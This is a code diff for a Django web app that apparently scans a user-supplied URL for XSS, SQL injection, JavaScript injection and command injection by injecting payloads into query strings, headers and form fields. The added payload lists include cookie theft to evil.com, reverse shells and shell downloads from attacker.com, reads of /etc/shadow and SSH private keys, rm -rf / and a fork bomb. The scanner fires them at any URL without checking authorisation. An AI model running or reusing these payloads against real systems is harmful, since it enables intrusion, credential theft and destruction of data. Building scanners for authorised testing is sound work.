@@ -1,3 +1,5 @@
+from urllib import request
+
 from django.shortcuts import render
 import urllib.request
 import urllib.error
@@ -7,6 +9,9 @@ from urllib.parse import urlparse
 import matplotlib.pyplot as plt
 import io
 import urllib, base64
+import requests
+import re
+from urllib.parse import urlparse, quote
 
 
 class HTTP_HEADER:
@@ -14,23 +19,67 @@ class HTTP_HEADER:
     SERVER = "Server"
 
 
+from django.shortcuts import render, redirect
+from django.contrib.auth import login, logout, authenticate
+from django.contrib.auth.forms import UserCreationForm, AuthenticationForm
+from django.contrib.auth.decorators import login_required
+from django.contrib import messages
+from .models import ScanResult
+
+# ✅ User Registration (Signup)
+def register_user(request):
+    if request.method == "POST":
+        form = UserCreationForm(request.POST)
+        if form.is_valid():
+            user = form.save()
+            login(request, user)  # Auto-login after registration
+            return redirect("dashboard")
+    else:
+        form = UserCreationForm()
+    return render(request, "register.html", {"form": form})
+
+# ✅ User Login
+def login_user(request):
+    if request.method == "POST":
+        form = AuthenticationForm(data=request.POST)
+        if form.is_valid():
+            user = form.get_user()
+            login(request, user)
+            return redirect("dashboard")
+    else:
+        form = AuthenticationForm()
+    return render(request, "login.html", {"form": form})
+
+# ✅ User Logout
+def logout_user(request):
+    logout(request)
+    return redirect("login")
+
+# ✅ Dashboard (Protected)
+@login_required
+def dashboard(request):
+    scans = ScanResult.objects.filter(user=request.user)
+    return render(request, "dashboard.html", {"scans": scans})
+
+
 
 def home(request):
     if request.method == 'POST':
         if not request.POST.get('url'):
-            context = "No URL found."
+            context = {"error": "No URL found."}
             return render(request, 'home.html', context)
         else:
             url = request.POST['url']
-            context = {
-                'url': url
-            }
-            scanner(url, context) 
-            if 'error' in context['headers']:
+            context = {'url': url}
+
+            scanner(url, context, request)  # ✅ Now passing request to scanner()
+
+            if 'error' in context.get('headers', {}):
                 context['error'] = context['headers']['error']
                 return render(request, 'home.html', context)
             else:
                 return render(request, 'output.html', context)
+
     return render(request, 'home.html')
 
 
@@ -40,7 +89,7 @@ def home(request):
 
 def headers_reader(url, context):
     headers = {
-        'backendTech' : "Fingerprinted the Backend Technologies."
+        'backendTech': "Fingerprinted the Backend Technologies."
     }
     try:
         opener = urllib.request.urlopen(url)
@@ -51,11 +100,11 @@ def headers_reader(url, context):
         Server = opener.headers.get(HTTP_HEADER.SERVER)
         headers['host'] = "Host: " + str(Host)
         headers['server'] = "WebServer: " + str(Server)
-        
+
         a = ''
         for item in opener.headers.items():
             for powered in item:
-                sig = "x-powered-by"      
+                sig = "x-powered-by"
                 if sig in item:
                     a = a + "[!] " + str(powered).strip() + '\n'
         headers['powered'] = a
@@ -64,145 +113,332 @@ def headers_reader(url, context):
             headers['error'] = "[!] Page was not found! Please check the URL"
         else:
             headers['error'] = ("[!] HTTP Error:", e)
-    
+
     context['headers'] = headers
 
 
 
 def main_function1(url, payloads, check):
-    # This function is going to split the url and try appending payloads in every parameter value.
-    opener = urllib.request.urlopen(url)
     vuln = 0
-    if opener.code == 999:
-        # Detecting the WebKnight WAF from the StatusCode.
-        # print("[~] WebKnight WAF Detected!")
-        # print("[~] Delaying 3 seconds between every request")
-        time.sleep(3)
-    query_params = urlparse(url).query
-    if query_params:
-        for params in query_params.split("&"):
-            for payload in payloads:
-                bugs = url.replace(params, params + str(payload).strip())
-                request = urllib.request.urlopen(bugs)
-                html = request.readlines()
-                for line in html:
-                    checker = re.findall(check, line.decode())
-                    if len(checker) != 0:
-                        vuln += 1
-    if vuln == 0:
-        return "[!] Target is not vulnerable!"
-    else:
-        return "[!] Congratulations you've found %i bugs :-)" % vuln
+    session = requests.Session()
 
+    if "?" in url:
+        base_url, query_params = url.split("?", 1)
+    else:
+        base_url = url
+        query_params = ""
+
+    for payload in payloads:
+        modified_url = f"{base_url}?{query_params}{payload}" if query_params else f"{base_url}/{payload}"
+
+        try:
+            res = session.get(modified_url, timeout=5)
+
+            if re.search(check, res.text) or payload in res.text:
+                vuln += 1
+                print("\n[DEBUG] Vulnerability Found!")
+                print("[DEBUG] URL Tested:", modified_url)
+                # print("[DEBUG] Response Content:", res.text[:500])  # Print first 500 characters
+
+        except requests.RequestException:
+            pass
+
+    return f"[!] Found {vuln} vulnerabilities!" if vuln > 0 else "[!] Target is not vulnerable!"
 
 
 def main_function2(url, payloads, check):
-    opener = urllib.request.urlopen(url)
+    """Similar to main_function1 but encodes payloads to bypass WAFs & includes header injection."""
     vuln = 0
-    if opener.code == 999:
-        time.sleep(3)
-    query_params = urlparse(url).query
-    if query_params:
-        for params in query_params.split("&"):
-            for payload in payloads:
-                encoded_payload = urllib.parse.quote(payload)
-                bugs = url.replace(params, params + encoded_payload)
-                try:
-                    request = urllib.request.urlopen(bugs)
-                    html = request.readlines()
-                    for line in html:
-                        checker = re.findall(check, line.decode())
-                        if len(checker) != 0:
-                            vuln += 1
-                except urllib.error.HTTPError as e:
-                    pass
-                except urllib.error.URLError as e:
-                    pass
-                except ValueError as e:
-                    pass
-    if vuln == 0:
-        return "[!] Target is not vulnerable!"
+    session = requests.Session()
+
+    # Check if the URL has query parameters
+    if "?" in url:
+        base_url, query_params = url.split("?", 1)
     else:
-        return "[!] Congratulations you've found %i bugs :-)" % vuln
+        base_url = url
+        query_params = ""
+
+    for payload in payloads:
+        encoded_payload = quote(payload)  # URL encode payload
+
+        # Inject into query parameters
+        if query_params:
+            modified_url = f"{base_url}?{query_params}{encoded_payload}"
+        else:
+            modified_url = f"{base_url}/{encoded_payload}"
+
+        try:
+            # Send request with payloads in headers as well
+            headers = {
+                "User-Agent": payload,
+                "Referer": payload
+            }
+            res = session.get(modified_url, headers=headers, timeout=5)
+
+            # Improved detection: Check raw, encoded, and byte versions of payload
+            if re.search(check, res.text) or \
+                    payload in res.text or \
+                    encoded_payload in res.text:
+                vuln += 1
+        except requests.RequestException:
+            pass
+
+    return f"[!] Found {vuln} vulnerabilities!" if vuln > 0 else "[!] Target is not vulnerable!"
 
 
+sqli_payloads = [
+    "' OR '1'='1' --",
+    "\" OR \"1\"=\"1\" --",
+    "' OR 'a'='a",
+    "1' OR '1'='1' --",
+    "1' OR 1=1 --",
+    "' UNION SELECT null, null --",
+    "' UNION SELECT 1,2,3 --",
+    "' UNION SELECT username, password FROM users --",
+    "' OR 1=CAST((SELECT @@version) AS INT) --",
+    "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
+    "admin' --",
+    "' UNION SELECT user(), database(), version() --",
+    "' UNION SELECT 1, table_name FROM information_schema.tables --",
+    "' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users' --",
+    "' UNION SELECT username, password FROM mysql.user --",
+    "' OR SLEEP(5) --",
+    "'; EXEC xp_cmdshell('whoami') --",
+    "' OR 1=1 LIMIT 1 --",
+    "' AND '1'='1",
+    "1' ORDER BY 3 --",
+    "1 AND 1=1 --",
+    "1' AND 'x'='x' --",
+    "1' AND EXISTS (SELECT * FROM users) --",
+    "1' AND (SELECT COUNT(*) FROM users) > 0 --",
+    "' OR (SELECT COUNT(*) FROM users) > 0 --"
+]
 
-# Remote Code Execution (RCE)
-def rce_func(url, context):
-    # headers_reader(url)
-    # Remote Code Injection Payloads
-    payloads = [';${@print(md5(zigoo0))}', ';${@print(md5("zigoo0"))}']
-    # Encrypted Payloads to bypass some Security Filters & WAF's
-    payloads += ['%253B%2524%257B%2540print%2528md5%2528%2522zigoo0%2522%2529%257D%2529%257D%253B']
-    # Remote Command Execution Payloads
-    payloads += [';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ';phpinfo']
-    # Used re.I to fix the case-sensitive issues like "payload" and "PAYLOAD".
-    check = re.compile("51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot", re.I)
-    context['rce'] = main_function2(url, payloads, check)
+xss_payloads = [
+    "<script>alert('XSS')</script>",
+    "\"><script>alert('XSS')</script>",
+    "'><script>alert('XSS')</script>",
+    "\"><img src=x onerror=alert('XSS')>",
+    # "<svg/onload=alert('XSS')>",
+    "<body onload=alert('XSS')>",
+    "javascript:alert('XSS')",
+    "<iframe src=javascript:alert('XSS')>",
+    "';alert(String.fromCharCode(88,83,83))//",
+    "<img src=1 href=1 onerror='javascript:alert(1)'>",
+    "<script>alert(document.cookie)</script>",
+    "<script>document.write('<img src=x onerror=alert(1)>')</script>",
+    "<script>eval('alert(1)')</script>",
+    "<script>setTimeout('alert(1)',1000)</script>",
+    "<marquee onstart=alert(1)>XSS</marquee>",
+    "<input type=text onfocus=alert(1) autofocus>",
+    "javascript:alert(1)//",
+    "';alert(1);//",
+    "<script>window.onerror=alert;throw 'XSS'</script>",
+    "<form><button formaction='javascript:alert(1)'>Click me</button></form>",
+    "<script>fetch('https://evil.com?cookie='+document.cookie)</script>"
+]
 
+js_payloads = [
+    "'; alert('JS Injection'); //",
+    "\"); alert('JS Injection'); //",
+    "\"> alert('JS Injection'); //",
+    "'; console.log('Injected JS'); //",
+    "\"); console.log('Injected JS'); //",
+    "'-alert(document.domain)-'",
+    "\");eval(String.fromCharCode(97,108,101,114,116,40,39,74,83,32,73,110,106,101,99,116,101,100,39,41))",
+    "'; fetch('https://evil.com?steal='+document.cookie); //",
+    "\"><script>alert('Injected JS')</script>",
+    "';window.location='https://evil.com'; //",
+    "\";document.write('<script>alert(1)</script>'); //",
+    "';document.body.innerHTML='<h1>Hacked</h1>'; //"
+]
 
+rce_payloads = [
+    # ";id",
+    "& whoami",
+    # "`id`",
+    "`whoami`",
+    "; uname -a",
+    "; cat /etc/passwd",
+    "; cat /etc/shadow",
+    "; cat ~/.ssh/id_rsa",
+    ";& ls -la",
+    ";& ps aux",
+    "'; echo vulnerable; #",
+    "'; nc -e /bin/sh attacker.com 4444; #",
+    "'; curl http://attacker.com/shell.sh | sh; #",
+    "'; wget http://attacker.com/shell.sh -O- | sh; #",
+    "'; bash -i >& /dev/tcp/attacker.com/4444 0>&1; #",
+    "'; python -c 'import os; os.system(\"/bin/sh\")'; #",
+    "'; php -r 'shell_exec(\"/bin/sh\")'; #",
+    "'; rm -rf /; #",
+    "'; fork bomb:(){ :|:& };: #"
+]
 
-
-def js_injection_func(url, context):
-    # headers_reader(url)    
-    # JavaScript Injection Payloads
-    payloads = ['<script>alert("XSS")</script>',
-                '<img src=x onerror=alert("XSS")>',
-                '<svg/onload=alert("XSS")>',
-                '"><svg/onload=alert("XSS")>',
-                '"><script>alert("XSS")</script>']
-    
-    # Regular expression to check for JavaScript execution
-    check = re.compile(r'<script>alert\("XSS"\)</script>|<img src=x onerror=alert\("XSS"\)>|<svg/onload=alert\("XSS"\)>|"\"><svg/onload=alert\("XSS"\)>|"\"><script>alert\("XSS"\)</script>', re.I)
-    context['js'] = main_function2(url, payloads, check)
-
-
-
-# Cross-site scripting (XSS)
 def xss_func(url, context):
-    # Payloads for XSS
-    payloads = ['%27%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', '%78%22%78%3e%78']
-    payloads += ['%22%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', 'zigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb']
-    check = re.compile('zigoo0<svg|x>x', re.I)
-    context['xss'] = main_function1(url, payloads, check)
-
+    check = re.compile(r"alert\(|XSS", re.I)
+    context['xss'] = main_function1(url, xss_payloads, check)
 
 def error_based_sqli_func(url, context):
-    # Payload = 12345'"\'\");|]*{%0d%0a<%00>%bf%27'  Yeaa let's bug the query :D :D
-    # Added Chinese characters to the SQLI payloads to bypass mysql_real_escape_*
-    payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><", "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
-    check = re.compile("Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
-    context['sqli'] = main_function1(url, payloads, check)
+    check = re.compile(r"SQL syntax|mysql_fetch|ODBC|Microsoft SQL Server", re.I)
+    context['sqli'] = main_function1(url, sqli_payloads, check)
+
+def js_injection_func(url, context):
+    check = re.compile(r"alert\(|JS Injection", re.I)
+    context['js'] = main_function1(url, js_payloads, check)
+
+def rce_func(url, context):
+    check = re.compile(r"root:x|uid=|Linux|Volume Serial", re.I)
+    context['rce'] = main_function1(url, rce_payloads, check)
 
 
+def scanner(url, context, request, user=None):
+    """Runs all vulnerability scans on the target URL and saves results in the session."""
 
-def scanner(url, context):
     headers_reader(url, context)
-    if not 'error' in context['headers']:
+
+    if 'error' not in context['headers']:
         xss_func(url, context)
         error_based_sqli_func(url, context)
         js_injection_func(url, context)
         rce_func(url, context)
 
-def report(request):
-    xdata = [90.43,23,54,76,120]
-    ydata=["Security","Mallfaction","Cyber","Networking","Authentication "]
-    plt.figure(figsize=(8, 4))
-    plt.bar(ydata, xdata, color='blue')
-    plt.xlabel('dark-tracing')
-    plt.ylabel('Values')
-    plt.title('Dark tracing for early ')
+        # ✅ Ensure form vulnerability testing is performed
+        check_pattern = re.compile(r"(alert\(|syntax error|SQL Server|Fatal error|injection)", re.I)
+        test_form_vulnerabilities(url, context, check_pattern)
 
-    # Save the chart to a BytesIO object
+        if user:  # ✅ Save scan only if user is logged in
+            ScanResult.objects.create(
+                user=user,
+                url=url,
+                xss=context.get("xss", ""),
+                sqli=context.get("sqli", ""),
+                js=context.get("js", ""),
+                rce=context.get("rce", ""),
+                form_vuln=context.get("form_vuln", "")
+            )
+
+    # ✅ Debug: Print scan results before saving to session
+    print("DEBUG - Scan Results:", context)
+
+    # ✅ Store results in Django session
+    request.session['scan_results'] = {
+        "xss": context.get("xss", ""),
+        "sqli": context.get("sqli", ""),
+        "js": context.get("js", ""),
+        "rce": context.get("rce", ""),
+        "form_vuln": context.get("form_vuln", "")
+    }
+    request.session.modified = True  # ✅ Ensure session updates
+
+    # ✅ Debug: Print session data after saving
+    print("DEBUG - Saved Session Data:", request.session.get("scan_results", {}))
+
+
+import matplotlib
+matplotlib.use('Agg')  # ✅ Non-GUI mode
+import matplotlib.pyplot as plt
+import io
+import base64
+from django.shortcuts import render
+
+import matplotlib
+matplotlib.use('Agg')  # ✅ Fix Matplotlib GUI issue
+import matplotlib.pyplot as plt
+import io
+import base64
+from django.shortcuts import render
+
+import re
+
+def extract_vulnerability_count(text):
+    """Extracts the number of vulnerabilities found from the scan result text."""
+    match = re.search(r"Found (\d+) vulnerabilities", text)
+    return int(match.group(1)) if match else 0  # Return the number found or 0 if no match
+
+def report(request):
+    """Generate a graphical and textual vulnerability report."""
+
+    # Retrieve scan results from session
+    scan_results = request.session.get("scan_results", {})
+
+    # ✅ Extract actual counts from the scan text
+    vulnerabilities = {
+        "XSS": extract_vulnerability_count(scan_results.get("xss", "")),
+        "SQL Injection": extract_vulnerability_count(scan_results.get("sqli", "")),
+        "JavaScript Injection": extract_vulnerability_count(scan_results.get("js", "")),
+        "Remote Code Execution": extract_vulnerability_count(scan_results.get("rce", "")),
+        "Form Vulnerabilities": extract_vulnerability_count(scan_results.get("form_vuln", ""))
+    }
+
+    # ✅ Debug: Print extracted values
+    print("DEBUG - Extracted Vulnerability Counts:", vulnerabilities)
+
+    # ✅ Generate the Matplotlib bar chart
+    plt.figure(figsize=(8, 4))
+    plt.bar(vulnerabilities.keys(), vulnerabilities.values(), color='blue')
+    plt.xlabel('Vulnerability Type')
+    plt.ylabel('Number of Issues Found')
+    plt.title('Vulnerability Scan Report')
+
+    # ✅ Save the plot to a BytesIO object
     buf = io.BytesIO()
     plt.savefig(buf, format='png')
     plt.close()
     buf.seek(0)
-    image_base64 = base64.b64encode(buf.read()).decode('utf-8')
+
+    # ✅ Convert to base64 for HTML display
+    chart_image = base64.b64encode(buf.read()).decode('utf-8')
     buf.close()
 
-    # Pass the base64 image to the template
-    context = {
-        'chart_image': image_base64,
-    }
-    return render(request, 'report.html', context)
+    return render(request, 'report.html', {
+        'chart_image': chart_image,
+        'scan_results': scan_results
+    })
+
+
+
+import requests
+from bs4 import BeautifulSoup
+import re
+
+
+def test_form_vulnerabilities(url, context, check):
+    """Detects form vulnerabilities by injecting payloads into form fields."""
+    session = requests.Session()
+    try:
+        res = session.get(url, timeout=5)
+        if res.status_code != 200:
+            context['form_vuln'] = "[!] Could not reach the target!"
+            return
+
+        soup = BeautifulSoup(res.text, "html.parser")
+        forms = soup.find_all("form")
+
+        if not forms:
+            context['form_vuln'] = "[!] No forms detected!"
+            return
+
+        payload = "<script>alert('XSS-DETECTED-123')</script>"
+        vuln_count = 0
+
+        for form in forms:
+            action = form.get("action")
+            method = form.get("method", "get").lower()
+            form_url = url if not action else requests.compat.urljoin(url, action)
+
+            inputs = form.find_all(["input", "textarea", "select"])
+            data = {input_field.get("name"): payload for input_field in inputs if input_field.get("name")}
+
+            res = session.post(form_url, data=data) if method == "post" else session.get(form_url, params=data)
+
+            # ✅ Use `check` regex pattern to verify execution
+            if re.search(check, res.text):
+                vuln_count += 1
+
+        context['form_vuln'] = f"[!] Found {vuln_count} form vulnerabilities!" if vuln_count > 0 else "[!] No form vulnerabilities found!"
+
+    except Exception as e:
+        context['form_vuln'] = f"[!] Error while scanning forms: {str(e)}"
+
+
